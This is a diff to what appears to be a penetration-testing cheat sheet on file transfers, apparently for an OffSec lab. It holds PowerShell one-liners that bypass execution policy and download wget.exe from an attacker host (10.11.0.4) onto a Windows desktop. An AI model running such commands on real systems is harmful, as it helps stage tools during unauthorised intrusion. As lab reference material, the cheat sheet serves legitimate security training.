@@ -4,7 +4,7 @@ https://www.file.io/
 ### Powershell
 ```
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')" 
-powershell -nop -Exec Bypass -NoLogo -NonInteractive -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+powershell -NoProfile -ExecutionPolicy Bypass -NoLogo -NonInteractive -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
 ```
 
 ### SCP Copy file from remote machine to local tmp
